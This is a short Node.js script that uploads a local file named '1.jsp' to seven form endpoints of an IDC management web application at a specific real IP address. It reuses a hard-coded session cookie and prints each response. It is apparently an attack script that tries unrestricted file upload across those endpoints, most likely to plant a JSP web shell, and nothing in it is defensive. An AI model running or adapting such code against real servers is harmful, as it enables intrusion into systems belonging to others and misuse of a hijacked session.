var upload = require('../../../utils/http-upload.js')
var fs = require('fs');
var Queue = require('../../../utils/queue.js');
var host = 'http://219.146.13.166/idc_sd'
var cookie = 'JSESSIONID=37EF71418562DB4BD428C40C4F351A98'
function buildFormData(){
    return {
        'command' : '10',
        'upfile' : {
            value : fs.createReadStream('/home/ponytail/Desktop/1.jsp'),
            options : {
                filename : '1.jsp'
            }
        }
    }
}

function up(url){
    return function(){
        return upload(url, cookie, buildFormData)
    }
}
var q = new Queue(1);

q.enqueue(up(host + '/jsp/idc/businessaudit/idcRisk.do'));
q.enqueue(up(host + '/jsp/idc/datacheck/mainInfoCheck.do'));
q.enqueue(up(host + '/jsp/idc/monitor/keywordConfig.do'));
q.enqueue(up(host + '/jsp/idc/monitor/teleSelfConfig.do'));
q.enqueue(up(host + '/jsp/idc/record/ipAddrInfoLib.do'));
q.enqueue(up(host + '/jsp/idc/sms/smsManager.do'));
q.enqueue(up(host + '/jsp/idc/webServiceManage/portProtocolManage.do'));

q.on('done', function(response){

    console.log(response.statusCode)
    console.log(response.body)

})